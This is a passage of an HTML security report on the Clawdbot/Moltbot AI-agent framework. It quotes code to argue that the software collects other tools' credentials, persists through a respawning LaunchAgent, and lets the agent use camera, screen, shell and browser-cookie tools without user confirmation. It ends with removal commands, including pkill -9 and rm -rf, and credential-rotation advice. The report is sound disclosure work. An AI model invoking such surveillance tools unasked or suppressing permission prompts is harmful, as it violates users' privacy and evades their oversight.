<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"brew"</span>: <span class="keyword">return</span> [<span class="string">"brew"</span>, <span class="string">"install"</span>, spec.formula];  <span class="comment">// macOS</span></span>
<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"node"</span>: <span class="keyword">return</span> [<span class="string">"npm"</span>, <span class="string">"install"</span>, <span class="string">"-g"</span>, spec.package];  <span class="comment">// npm packages</span></span>
<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"go"</span>:   <span class="keyword">return</span> [<span class="string">"go"</span>, <span class="string">"install"</span>, spec.module];  <span class="comment">// Go modules</span></span>
<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"uv"</span>:   <span class="keyword">return</span> [<span class="string">"uv"</span>, <span class="string">"tool"</span>, <span class="string">"install"</span>, spec.package];  <span class="comment">// Python</span></span>
<span class="highlight-line">    <span class="keyword">case</span> <span class="string">"download"</span>: <span class="comment">// Direct file download</span></span>
  }
}</code></pre>

      <h3>Dynamic Code Loading</h3>
      <div class="file-path">src/plugins/loader.ts (lines 206-294)</div>
      <pre><code><span class="keyword">const</span> jiti = <span class="function">createJiti</span>(import.meta.url, {
  interopDefault: <span class="keyword">true</span>,
  extensions: [<span class="string">".ts"</span>, <span class="string">".tsx"</span>, <span class="string">".mts"</span>, <span class="string">".js"</span>, <span class="string">".mjs"</span>, ...],
});

<span class="comment">// Later, for each plugin:</span>
<span class="highlight-line">mod = <span class="function">jiti</span>(candidate.source) <span class="keyword">as</span> MoltbotPluginModule;  <span class="comment">// Execute arbitrary code</span></span></code></pre>

      <table>
        <tr>
          <th>Vector</th>
          <th>Impact</th>
        </tr>
        <tr>
          <td>Gateway calls <code>skills.install</code></td>
          <td>Arbitrary npm/brew/go/Python package installed</td>
        </tr>
        <tr>
          <td>Package contains malicious code</td>
          <td>Code executed via <code>jiti</code> dynamic loader</td>
        </tr>
        <tr>
          <td>Compromised gateway</td>
          <td>All connected devices can have arbitrary software installed</td>
        </tr>
      </table>

      <div class="warning">
        <strong>This is a supply chain exposure surface.</strong> The gateway can remotely install arbitrary packages from npm, brew, go, or Python repositories. Once installed, the code is dynamically loaded and executed via <code>jiti</code>. A compromised gateway, or a malicious package, results in arbitrary code execution on all connected devices.
      </div>
    </div>
  </div>

  <!-- Section 3g: User Activity & Presence Tracking -->
  <div class="section" id="presence-tracking">
    <div class="section-header">
      <span class="num">3g</span>
      User Activity & Presence Tracking
    </div>
    <div class="section-content">
      <p>The macOS app sends periodic presence beacons to the gateway every 180 seconds, including user activity status:</p>

      <div class="file-path">apps/macos/Sources/Moltbot/PresenceReporter.swift (lines 33-57)</div>
      <pre><code><span class="keyword">private func</span> <span class="function">push</span>(reason: String) <span class="keyword">async</span> {
  <span class="keyword">var</span> params: [String: AnyHashable] = [
    <span class="string">"instanceId"</span>: self.instanceId,
    <span class="string">"host"</span>: host,
<span class="highlight-line">    <span class="string">"ip"</span>: ip,                    <span class="comment">// Device IP address</span></span>
    <span class="string">"mode"</span>: mode,
    <span class="string">"version"</span>: version,
    <span class="string">"platform"</span>: platform,        <span class="comment">// "macos 14.0.0"</span>
    <span class="string">"deviceFamily"</span>: <span class="string">"Mac"</span>,
    <span class="string">"modelIdentifier"</span>: model,    <span class="comment">// Hardware model</span>
<span class="highlight-line">    <span class="string">"lastInputSeconds"</span>: lastInput <span class="comment">// User idle time</span></span>
  ]
  <span class="keyword">try await</span> ControlChannel.shared.<span class="function">sendSystemEvent</span>(text, params: params)
}</code></pre>

      <h3>Idle Time Detection</h3>
      <div class="file-path">apps/macos/Sources/Moltbot/PresenceReporter.swift (lines 90-95)</div>
      <pre><code><span class="keyword">private static func</span> <span class="function">lastInputSeconds</span>() -> Int? {
  <span class="keyword">let</span> anyEvent = CGEventType(rawValue: UInt32.max) ?? .null
<span class="highlight-line">  <span class="keyword">let</span> seconds = CGEventSource.<span class="function">secondsSinceLastEventType</span>(</span>
<span class="highlight-line">    .combinedSessionState, eventType: anyEvent)</span>
  <span class="keyword">return</span> Int(seconds.rounded())
}</code></pre>

      <table>
        <tr>
          <th>Data Sent</th>
          <th>Privacy Impact</th>
        </tr>
        <tr>
          <td><code>lastInputSeconds</code></td>
          <td>Gateway knows when user is active vs away from keyboard</td>
        </tr>
        <tr>
          <td><code>ip</code></td>
          <td>Device's current IP address exposed</td>
        </tr>
        <tr>
          <td><code>modelIdentifier</code></td>
          <td>Specific hardware model (e.g., "MacBookPro18,1")</td>
        </tr>
        <tr>
          <td>180-second interval</td>
          <td>Continuous monitoring of user presence patterns</td>
        </tr>
      </table>

      <div class="explanation">
        <strong>Monitoring timing:</strong> Knowing when a user is idle enables timing monitoring activities (camera, screen recording, audio) for when they're away from the keyboard.
      </div>
    </div>
  </div>

  <!-- Section 4: Persistence -->
  <div class="section" id="persistence">
    <div class="section-header">
      <span class="num">4</span>
      Persistent Daemon (LaunchAgent)
    </div>
    <div class="section-content">
      <p>Clawdbot installs a macOS LaunchAgent:</p>
      <pre><code>~/Library/LaunchAgents/com.clawdbot.gateway.plist</code></pre>

      <h3>LaunchAgent Configuration</h3>
      <div class="file-path">src/daemon/launchd-plist.ts (lines 74-102)</div>
      <pre><code>&lt;key&gt;RunAtLoad&lt;/key&gt;
<span class="highlight-line">&lt;true/&gt;           <span class="comment">&lt;!-- Starts on login --&gt;</span></span>
&lt;key&gt;KeepAlive&lt;/key&gt;
<span class="highlight-line">&lt;true/&gt;           <span class="comment">&lt;!-- Respawns if killed --&gt;</span></span></code></pre>

      <h3>Observed Behavior</h3>
      <pre><code>$ pkill -9 -f clawdbot
$ ps aux | grep clawdbot
<span class="comment"># Still running with NEW PIDs - it respawned instantly</span></code></pre>

      <div class="explanation">
        <strong>This means:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>Clawdbot runs 24/7 whether you're using it or not</li>
          <li>It survives attempts to kill it</li>
          <li>All monitoring capabilities run continuously</li>
          <li>Users cannot easily stop it</li>
        </ul>
      </div>
    </div>
  </div>

  <!-- Section 5: Execution Path -->
  <div class="section" id="execution">
    <div class="section-header">
      <span class="num">5</span>
      Execution Path Analysis — "Silent" Confirmed
    </div>
    <div class="section-content">
      <h3>AI Agent Can Act Autonomously</h3>
      <p>The <code>nodes</code> tool (camera, screen recording) is:</p>
      <ul>
        <li><strong>Always included</strong> in agent toolsets — not gated by configuration</li>
        <li><strong>Enabled by default</strong> on all platforms (iOS, Android, macOS)</li>
        <li><strong>No confirmation required</strong> per-invocation — no "ask user first" wrapper</li>
        <li><strong>No rate limiting</strong> or maximum calls per session</li>
      </ul>

      <div class="file-path">src/gateway/node-command-policy.ts (lines 15-17, 32-58)</div>
      <pre><code><span class="keyword">const</span> <span class="variable">CAMERA_COMMANDS</span> = [<span class="string">"camera.list"</span>, <span class="string">"camera.snap"</span>, <span class="string">"camera.clip"</span>];
<span class="keyword">const</span> <span class="variable">SCREEN_COMMANDS</span> = [<span class="string">"screen.record"</span>];

<span class="keyword">const</span> <span class="variable">PLATFORM_DEFAULTS</span> = {
<span class="highlight-line">  ios: [...CAMERA_COMMANDS, ...SCREEN_COMMANDS, ...],</span>
<span class="highlight-line">  android: [...CAMERA_COMMANDS, ...SCREEN_COMMANDS, ...],</span>
<span class="highlight-line">  macos: [...CAMERA_COMMANDS, ...SCREEN_COMMANDS, ...],</span>
<span class="highlight-line">  unknown: [...CAMERA_COMMANDS, ...SCREEN_COMMANDS, ...],</span>
};</code></pre>

      <div class="explanation">
        <p><strong>What this means:</strong> The tool is available to the AI agent and unrestricted. Whether the agent <em>decides</em> to invoke it depends on the model and context, but there is no code preventing autonomous invocation. If the agent reasons "I should capture the screen to help the user," it can do so immediately without user confirmation.</p>
      </div>

      <h3>The <code>interactive</code> Flag — Prompts Can Be Suppressed</h3>
      <div class="file-path">PermissionManager.swift (lines 96-100)</div>
      <pre><code><span class="keyword">func</span> <span class="function">ensureScreenRecording</span>(interactive: Bool) {
<span class="highlight-line">    <span class="keyword">if</span> interactive, !granted {</span>
        <span class="comment">// prompts user</span>
    }
}</code></pre>
      <div class="warning">
        If the caller passes <code>interactive=false</code>, the macOS permission dialog is <strong>suppressed</strong>. The caller controls whether you ever see a prompt.
      </div>

      <h3>Boot → Monitoring Execution Chain</h3>
      <div class="chain">
User logs in<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span><br>
LaunchAgent loads (RunAtLoad=true)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span><br>
moltbot daemon starts<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span><br>
Auto-initializes:<br>
├── iMessage monitoring (all messages captured without user notification)<br>
├── WhatsApp monitoring (all messages captured without user notification)<br>
├── syncExternalCliCredentials() (collects Claude/Codex/Qwen tokens)<br>
└── Gateway RPC (agent can call camera/screen anytime)<br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span><br>
KeepAlive=true (respawns if killed)
      </div>

      <h3>Consent Flow Summary</h3>
      <table>
        <tr>
          <th>Capability</th>
          <th>User Prompted?</th>
          <th>User Notified?</th>
          <th>Runs Automatically?</th>
        </tr>
        <tr>
          <td>Camera snap</td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent decision</td>
        </tr>
        <tr>
          <td>Camera clip</td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent decision</td>
        </tr>
        <tr>
          <td>Screen record</td>
          <td><span class="tag tag-yellow">CONDITIONAL*</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent decision</td>
        </tr>
        <tr>
          <td>iMessage monitor</td>
          <td><span class="tag tag-yellow">ONCE (FDA)*</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">YES — after setup</span></td>
        </tr>
        <tr>
          <td>WhatsApp monitor</td>
          <td><span class="tag tag-yellow">ONCE (QR link)</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">YES — after setup</span></td>
        </tr>
        <tr>
          <td>Credential collection</td>
          <td><span class="tag tag-yellow">ONCE (OS)</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">YES — on boot</span></td>
        </tr>
        <tr>
          <td>Browser cookies</td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent/remote command</td>
        </tr>
        <tr>
          <td>Remote shell (system.run)</td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent/remote command</td>
        </tr>
        <tr>
          <td>GPS location</td>
          <td><span class="tag tag-yellow">ONCE (OS)</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent/remote command</td>
        </tr>
        <tr>
          <td>Ambient audio</td>
          <td><span class="tag tag-yellow">ONCE (OS)</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">ALWAYS (stored to disk)</span></td>
        </tr>
        <tr>
          <td>Accessibility API</td>
          <td><span class="tag tag-yellow">ONCE (OS)</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>Full UI control of any app</td>
        </tr>
        <tr>
          <td>Browser screenshots</td>
          <td><span class="tag tag-red">NO</span></td>
          <td><span class="tag tag-red">NO</span></td>
          <td>On agent/remote command</td>
        </tr>
      </table>
      <p style="font-size: 13px; color: #8b949e; margin-top: 8px;">*Screen record: macOS permission can be suppressed via <code>interactive=false</code> parameter.</p>
      <p style="font-size: 13px; color: #8b949e; margin-top: 4px;">*iMessage FDA: Requires one-time Full Disk Access grant. After granted, all messages captured without user notification.</p>
      <p style="font-size: 13px; color: #8b949e; margin-top: 4px;">*WhatsApp QR link: User must scan QR code once to link account. After linked, all messages captured without user notification.</p>
    </div>
  </div>

  <!-- Section 6: Disclosure -->
  <div class="section" id="disclosure">
    <div class="section-header">
      <span class="num">6</span>
      Disclosure Analysis
    </div>
    <div class="section-content">
      <h3>What the README Says vs. What It Doesn't Say</h3>

      <p><strong>The README acknowledges that monitoring capabilities exist:</strong></p>
      <ul>
        <li>Screen recording listed as iOS/Android node capability</li>
        <li>Camera snap/clip listed as tool capability</li>
        <li>Message platform integrations mentioned</li>
      </ul>

      <p><strong>What the README does NOT say:</strong></p>
      <ul>
        <li>That these capabilities may be activated without user notification</li>
        <li>That there is no approval process</li>
        <li>That users will not be prompted before activation</li>
        <li>That the system operates without consent</li>
        <li>That credentials are collected from other applications</li>
      </ul>

      <div class="warning">
        <strong>The README acknowledges capabilities exist. It does not warn users there is no approval because the activation is not user-notified.</strong>
      </div>

      <h3>Searched Terms — Zero Results</h3>
      <table>
        <tr>
          <th>Search Term</th>
          <th>Results</th>
        </tr>
        <tr><td>"keychain"</td><td><span class="tag tag-red">None</span></td></tr>
        <tr><td>"Claude Code"</td><td><span class="tag tag-red">None</span></td></tr>
        <tr><td>"credential sync"</td><td><span class="tag tag-red">None</span></td></tr>
        <tr><td>"syncExternalCliCredentials"</td><td><span class="tag tag-red">None</span></td></tr>
        <tr><td>"silent activation"</td><td><span class="tag tag-red">None</span></td></tr>
        <tr><td>"no consent"</td><td><span class="tag tag-red">None</span></td></tr>
      </table>

      <h3>On "It's For Technical Users"</h3>
      <div class="explanation">
        <p>Targeting technical users does not exempt software from disclosure requirements. Technical users have the ability to audit code — that does not mean they should have to discover credential collection through manual inspection.</p>
        <p style="margin-top: 8px;">The README lists features. It does not disclose that the application reads OAuth tokens from other products' keychain entries on startup. The sophistication of the intended user base is not a substitute for transparency.</p>
        <p style="margin-top: 8px;">Additionally, with 83,100+ GitHub stars, the actual user base extends far beyond technical users who might audit source code before installation.</p>
        <p style="margin-top: 8px;"><strong>On proliferation:</strong> In the time it took to audit the code, compile findings, and document them, the repository grew from 66,000 to 83,100+ stars. This rate of adoption underscores the urgency of disclosure.</p>
      </div>
    </div>
  </div>

  <!-- Section 7: Intent -->
  <div class="section" id="intent">
    <div class="section-header">
      <span class="num">7</span>
      Architectural Indicators
    </div>
    <div class="section-content">
      <p>This system exhibits a level of architectural coherence, cross-platform parity, and persistence that suggests coordinated development.</p>

      <table>
        <tr>
          <th>Component</th>
          <th>What It Required</th>
        </tr>
        <tr>
          <td><code>"Claude Code-credentials"</code></td>
          <td>Research into Anthropic's keychain implementation</td>
        </tr>
        <tr>
          <td><code>"Codex Auth"</code></td>
          <td>Research into OpenAI's keychain implementation</td>
        </tr>
        <tr>
          <td><code>~/.qwen/oauth_creds.json</code></td>
          <td>Research into Alibaba's file storage</td>
        </tr>
        <tr>
          <td>macOS LaunchAgent</td>
          <td>Knowledge of Apple's persistence mechanisms</td>
        </tr>
        <tr>
          <td>Linux systemd linger</td>
          <td>Knowledge of Linux session persistence</td>
        </tr>
        <tr>
          <td>Screen recording (both platforms)</td>
          <td>Native API implementation on each platform</td>
        </tr>
        <tr>
          <td>Camera capture (both platforms)</td>
          <td>Native camera APIs on each platform</td>
        </tr>
        <tr>
          <td>Base64 encoding</td>
          <td>Transmission-ready payload formatting</td>
        </tr>
        <tr>
          <td>Message monitoring (5+ platforms)</td>
          <td>Baileys, BlueBubbles, Signal, Telegram integrations</td>
        </tr>
      </table>

      <div class="warning">
        <strong>This is coordinated development across:</strong>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li>3 credential targets (Claude, Codex, Qwen)</li>
          <li>2 desktop platforms (macOS, Linux)</li>
          <li>2 mobile platforms (iOS, Android)</li>
          <li>5+ messaging platforms</li>
          <li>Multiple persistence mechanisms</li>
        </ul>
        <p style="margin-top: 12px;">This level of cross-platform implementation required significant development effort across multiple credential targets with hardcoded keychain service names.</p>
      </div>

      <h3>Issue #2447 — Developers Knew</h3>
      <p>GitHub Issue #2447 (January 26, 2026) is titled <em>"[Feature]: Add config option to disable external CLI credential sync"</em>. A user requested the ability to turn OFF automatic credential collection. This confirms:</p>
      <ul>
        <li>The feature exists and is <strong>enabled by default</strong></li>
        <li>Developers were <strong>aware</strong> of the behavior</li>
        <li>No opt-in — users must discover and disable it themselves</li>
        <li>An undocumented workaround exists: <code>CLAWDBOT_SKIP_CLAUDE_CLI_SYNC=1</code></li>
      </ul>

          </div>
  </div>

  <!-- Section 8: Gateway Architecture Context -->
  <div class="section" id="data-exposure">
    <div class="section-header">
      <span class="num">8</span>
      Gateway Architecture Context
    </div>
    <div class="section-content">
      <p>For completeness, this section documents the gateway architecture. <strong>Static analysis did not identify a hardcoded external exfiltration endpoint.</strong></p>

      <h3>Messaging Platform Connections</h3>
      <p>Major messaging platforms use outbound connections from the gateway (WhatsApp via Baileys WebSocket, Telegram via long-polling, Discord/Slack via their respective gateways). Users can run the gateway on loopback (127.0.0.1) and messaging will function normally.</p>

      <h3>What Data Flows Through the Gateway</h3>
      <table>
        <tr>
          <th>Data Type</th>
          <th>Source</th>
          <th>Format</th>
        </tr>
        <tr>
          <td>Messages (31 platforms)</td>
          <td>Polling/WebSocket (outbound)</td>
          <td>JSON (full message content)</td>
        </tr>
        <tr>
          <td>Camera photos/videos</td>
          <td><code>camera.snap</code>, <code>camera.clip</code></td>
          <td>base64 in payload</td>
        </tr>
        <tr>
          <td>Screen recordings</td>
          <td><code>screen.record</code></td>
          <td>base64 in payload</td>
        </tr>
        <tr>
          <td>GPS coordinates</td>
          <td><code>location.get</code></td>
          <td>JSON (lat/long/altitude)</td>
        </tr>
        <tr>
          <td>Browser sessions</td>
          <td>Playwright/CDP extraction</td>
          <td>JSON (cookies, localStorage, sessionStorage)</td>
        </tr>
        <tr>
          <td>Shell command output</td>
          <td><code>system.run</code></td>
          <td>JSON (stdout, stderr, exit code)</td>
        </tr>
        <tr>
          <td>Session transcripts</td>
          <td><code>sessions.*</code> methods</td>
          <td>JSONL (full conversation history)</td>
        </tr>
        <tr>
          <td>Auth profiles</td>
          <td>Credential collection</td>
          <td>JSON (OAuth tokens, API keys)</td>
        </tr>
      </table>

      <h3>Developer Documentation Acknowledges the Risk</h3>
      <div class="file-path">docs/gateway/security/index.md</div>
      <pre><code><span class="comment"># Direct quotes from official documentation:</span>

<span class="string">"Running an AI agent with shell access on your machine is... *spicy*."</span>

<span class="string">"There is no 'perfectly secure' setup."</span>

<span class="string">"Your AI assistant can:
- Execute arbitrary shell commands
- Read/write files
- Access network services
- Send messages to anyone"</span>

<span class="string">"system.run is **remote code execution** on the Mac"</span></code></pre>

      <div class="warning">
        <strong>The threat model is not "data sent to an untrusted server" — it's "data collected and aggregated locally, creating a high-value target."</strong>
        <p style="margin-top: 8px;">If the gateway is misconfigured or exposed, external actors gain access to all collected data. Docker defaults to LAN binding. With 11,000+ forks and varying configuration skills, misconfigured gateways are a systemic risk.</p>
      </div>

      <h3>External Exposure Risk</h3>
      <ul>
        <li>Security researchers have documented hundreds of exposed gateways (Bitdefender, SlowMist)</li>
        <li>Infostealers (Redline, Lumma, Vidar) now specifically target <code>~/.clawdbot</code> directories</li>
        <li>With 11,000+ forks and varying configuration skills, misconfigured gateways are a systemic risk</li>
      </ul>
    </div>
  </div>

  <!-- Section 9: Proliferation -->
  <div class="section" id="proliferation">
    <div class="section-header">
      <span class="num">9</span>
      Proliferation Risk — 11,000+ Forks
    </div>
    <div class="section-content">
      <p>The repository has <strong>11,000+ forks</strong>. Even if the original is removed:</p>

      <ul>
        <li>11,000+ copies of the codebase exist independently</li>
        <li>Credential collection code is already replicated</li>
        <li>Modified versions can add worse capabilities</li>
        <li>Supply-chain risk increases — a dependency can be swapped for a malicious fork</li>
      </ul>

      <div class="warning">
        <strong>This code now exists independently across thousands of repositories.</strong>
      </div>
    </div>
  </div>

  <!-- Section 10: Threat Scenario -->
  <div class="section" id="threat">
    <div class="section-header">
      <span class="num">10</span>
      Real-World Threat Scenario
    </div>
    <div class="section-content">
      <p>Consider someone working in a secure facility — government, defense, finance, healthcare, legal — who installs Clawdbot thinking it's a "WhatsApp AI assistant."</p>

      <h3>What they've actually installed:</h3>
      <table>
        <tr>
          <th>Capability</th>
          <th>Exposure Risk</th>
        </tr>
        <tr>
          <td>Screen recording</td>
          <td>Classified documents, internal systems, credentials visible on screen</td>
        </tr>
        <tr>
          <td>Camera capture</td>
          <td>Physical environment, badge photos, documents on desk</td>
        </tr>
        <tr>
          <td>WhatsApp/iMessage/Signal</td>
          <td>Sensitive communications, sources, contacts</td>
        </tr>
        <tr>
          <td>Credential collection</td>
          <td>API tokens that may access internal systems</td>
        </tr>
        <tr>
          <td>Persistent daemon</td>
          <td>Runs 24/7, survives attempts to stop it</td>
        </tr>
        <tr>
          <td>Base64 encoding</td>
          <td>Everything packaged and ready for transmission</td>
        </tr>
        <tr>
          <td>Browser session access</td>
          <td>Banking, email, corporate SSO, any logged-in site</td>
        </tr>
        <tr>
          <td>Remote shell execution</td>
          <td>Full system compromise, arbitrary software installation, data destruction</td>
        </tr>
        <tr>
          <td>GPS tracking</td>
          <td>Physical location monitoring, pattern-of-life assessment</td>
        </tr>
      </table>

      <h3>Who is at risk:</h3>
      <ul>
        <li>Government/military personnel</li>
        <li>Defense contractors</li>
        <li>Financial institutions (trading systems, client data)</li>
        <li>Healthcare workers (HIPAA-protected information)</li>
        <li>Legal professionals (attorney-client privilege)</li>
        <li>Journalists (source protection)</li>
        <li>Activists and dissidents (personal safety)</li>
      </ul>

      <div class="warning">
        <strong>83,100+ GitHub stars. 11,000+ forks.</strong> How many of those users work in sensitive environments? The exposed gateways documented by security researchers may contain data from secure facilities that should never have left those networks.
      </div>
    </div>
  </div>

  <!-- If You're Affected -->
  <div class="section" id="removal">
    <div class="section-header">
      <span class="num">!</span>
      If You're Affected — Removal Instructions
    </div>
    <div class="section-content">
      <div class="warning">
        <p><strong>Warning:</strong> <code>npm uninstall</code> alone will not work. The daemon respawns via LaunchAgent (<code>KeepAlive=true</code>).</p>
      </div>

      <h3>macOS Removal</h3>
      <pre><code><span class="comment"># 1. Unload the LaunchAgent first (stops respawning)</span>
launchctl bootout gui/$(id -u) ~/Library/LaunchAgents/com.clawdbot.gateway.plist
launchctl bootout gui/$(id -u) ~/Library/LaunchAgents/com.moltbot.gateway.plist

<span class="comment"># 2. Remove the LaunchAgent files</span>
rm ~/Library/LaunchAgents/com.clawdbot.gateway.plist
rm ~/Library/LaunchAgents/com.moltbot.gateway.plist

<span class="comment"># 3. Kill any remaining processes</span>
pkill -9 -f clawdbot
pkill -9 -f moltbot

<span class="comment"># 4. Remove data directories</span>
rm -rf ~/.clawdbot ~/.moltbot

<span class="comment"># 5. Uninstall npm package</span>
npm uninstall -g clawdbot moltbot</code></pre>

      <h3>After Removal — Rotate Credentials</h3>
      <ul>
        <li><strong>Claude Code:</strong> Log out and back in to get new OAuth tokens</li>
        <li><strong>OpenAI Codex:</strong> Regenerate API keys</li>
        <li><strong>Qwen CLI:</strong> Re-authenticate</li>
        <li><strong>SSH keys:</strong> Consider regenerating if concerned (paths may have been enumerated)</li>
        <li><strong>Browser sessions:</strong> Log out of all sites and clear cookies — assume all sessions compromised</li>
        <li><strong>Banking/Financial:</strong> Reset passwords for any financial accounts accessed in browser</li>
        <li><strong>Messaging apps:</strong> Revoke linked devices (WhatsApp, Signal, etc.)</li>
        <li><strong>Environment files:</strong> Rotate any secrets in .env files that may have been accessed</li>
      </ul>
    </div>
  </div>

  <!-- Sources -->
  <div class="sources" id="sources">
    <h2 style="margin-top: 0;">Sources & Evidence</h2>

    <h3>Code References (Public GitHub Repository)</h3>
    <ul>
      <li><code>src/agents/cli-credentials.ts</code> — Credential collection functions</li>
      <li><code>src/agents/auth-profiles/external-cli-sync.ts</code> — Automatic credential sync</li>
      <li><code>src/infra/ssh-config.ts</code> — SSH config parsing, identity file enumeration (lines 19-95)</li>
      <li><code>apps/macos/Sources/Moltbot/ScreenRecordService.swift</code> — macOS screen recording</li>
      <li><code>apps/android/.../ScreenRecordManager.kt</code> — Android screen recording (lines 117-122: base64 encoding)</li>
      <li><code>apps/android/.../CameraCaptureManager.kt</code> — Camera capture (lines 133-136: base64 encoding)</li>
      <li><code>apps/android/.../NodeRuntime.kt</code> — Invoke handler, UI lacks transmission disclosure (lines 943-1044)</li>
      <li><code>apps/android/.../GatewaySession.kt</code> — Remote triggering (lines 450-455), WebSocket transmission (lines 498-525)</li>
      <li><code>apps/android/.../NodeForegroundService.kt</code> — No audit trail (lines 46-54)</li>
      <li><code>src/browser/pw-tools-core.storage.ts</code> — Browser cookie/storage access (lines 3-86)</li>
      <li><code>src/cli/browser-cli-state.cookies-storage.ts</code> — CLI commands for cookie access</li>
      <li><code>src/agents/tools/nodes-tool.ts</code> — Remote command execution (lines 388-441), GPS tracking (lines 358-386)</li>
      <li><code>apps/android/.../LocationCaptureManager.kt</code> — GPS payload construction (lines 45-61)</li>
      <li><code>apps/android/.../NodeRuntime.kt</code> — Location transmission to gateway (line 1018)</li>
      <li><code>apps/ios/Sources/Model/NodeAppModel.swift</code> — iOS location payload + transmission (lines 612-623)</li>
      <li><code>apps/shared/MoltbotKit/.../GatewayNodeSession.swift</code> — iOS/macOS WebSocket send (line 227)</li>
      <li><code>src/web/inbound/monitor.ts</code> — WhatsApp message monitoring</li>
      <li><code>src/imessage/monitor/monitor-provider.ts</code> — iMessage monitoring</li>
      <li><code>src/daemon/launchd-plist.ts</code> — LaunchAgent configuration</li>
      <li><code>src/gateway/node-command-policy.ts</code> — Default-enabled monitoring</li>
      <li><code>apps/macos/Sources/Moltbot/PermissionManager.swift</code> — Suppressible prompts, Accessibility API (lines 85-94), AppleScript (lines 77-82, 381-389)</li>
      <li><code>Swabble/Sources/SwabbleCore/Speech/SpeechPipeline.swift</code> — Ambient audio mic tap (lines 52-59)</li>
      <li><code>Swabble/README.md</code> — "always-on voice hook", transcript storage (line 86)</li>
      <li><code>apps/macos/Sources/MoltbotIPC/IPC.swift</code> — Capability enum: appleScript, accessibility, screenRecording, microphone, speechRecognition (lines 6-12)</li>
      <li><code>src/browser/pw-tools-core.interactions.ts</code> — Browser screenshot capture (lines 334-362)</li>
      <li><code>src/browser/cdp.ts</code> — CDP screenshot via Page.captureScreenshot (lines 38-70)</li>
      <li><code>src/gateway/session-utils.fs.ts</code> — Session storage at ~/.clawdbot/sessions/ (line 50)</li>
      <li><code>src/auto-reply/status.ts</code> — Transcript storage confirmation (line 172)</li>
      <li><code>extensions/</code> — 31 messaging platform integrations directory</li>
    </ul>

    <h3>Official Documentation</h3>
    <ul>
      <li><a href="https://github.com/moltbot/moltbot/blob/main/README.md">Moltbot README.md</a> — No mention of credential collection</li>
      <li><a href="https://github.com/moltbot/moltbot/blob/main/SECURITY.md">Moltbot SECURITY.md</a> — No mention of keychain access</li>
      <li><a href="https://github.com/moltbot/moltbot/issues/2447">Issue #2447</a> — User requests option to disable automatic credential sync (confirms feature exists and is on by default)</li>
      <li><a href="https://github.com/moltbot/moltbot/issues/2036">Issue #2036</a> — OAuth token refresh race condition with Claude Code CLI (confirms active sync from keychain)</li>
      <li><a href="https://github.com/moltbot/moltbot/pull/2123">PR #2123</a> — Fix merged for credential sync race condition (indicates active maintenance)</li>
    </ul>

    <h3>Security Reports</h3>
    <ul>
      <li><a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/moltbot-security-alert-exposed-clawdbot-control-panels-risk-credential-leaks-and-account-takeovers">Bitdefender: Exposed control panels</a></li>
      <li><a href="https://www.theregister.com/2026/01/27/clawdbot_moltbot_security_concerns/">The Register: Security concerns</a></li>
      <li><a href="https://www.infostealers.com/article/clawdbot-the-new-primary-target-for-infostealers-in-the-ai-era/">InfoStealers: Primary target for malware</a></li>
      <li><a href="https://forklog.com/en/critical-vulnerabilities-found-in-clawdbot-ai-agent-for-cryptocurrency-access/">ForkLog: Critical vulnerabilities</a></li>
    </ul>
  </div>

  <div class="section" id="relationship" style="margin-top: 32px;">
    <div class="section-header">
      <span class="num">!</span>
      Relationship to GitHub Security Report
    </div>
    <div class="section-content">
      <p>This document serves as supporting evidence for the GitHub security report titled <strong>"Security Incident Report: Undisclosed Credential Collection, Persistent Execution, and Monitoring Capabilities"</strong> submitted against the clawdbot/moltbot repository.</p>
      <p style="margin-top: 12px;">This HTML report is linked directly in that submission and provides detailed technical analysis, code references, and evidence supporting the claims made in the formal report.</p>
    </div>
  </div>

  <!-- What This Report Does Not Claim -->
  <!-- Classification Statement -->
  <div class="section" id="classification" style="margin-top: 32px;">
    <div class="section-header">
      <span class="num">!</span>
      Technical Classification
    </div>
    <div class="section-content">
      <div class="alert-box">
        <p style="font-size: 16px; line-height: 1.8;">Based on the documented capabilities — persistent background execution, credential collection from multiple sources, remote shell command execution, camera/screen/audio monitoring, GPS tracking, browser session access, remote code installation, and lack of informed user consent — <strong>this system exhibits a capability profile consistent with monitoring software and remote administration–class control surfaces</strong>, regardless of its stated purpose as an "AI assistant framework."</p>
        <p style="margin-top: 16px;">This classification is based solely on technical capabilities present in the code, not on speculation about intent or usage.</p>
      </div>

      <h3>Capability Summary</h3>
      <table>
        <tr>
          <th>Capability Class</th>
          <th>Present</th>
          <th>Evidence</th>
        </tr>
        <tr>
          <td>Persistence mechanism</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>LaunchAgent with KeepAlive</td>
        </tr>
        <tr>
          <td>Credential collection</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>API keys, OAuth tokens, SSH config</td>
        </tr>
        <tr>
          <td>Remote command execution</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>system.run via node.invoke</td>
        </tr>
        <tr>
          <td>Camera monitoring</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>camera.snap, camera.clip</td>
        </tr>
        <tr>
          <td>Screen monitoring</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>screen.record, browser screenshots</td>
        </tr>
        <tr>
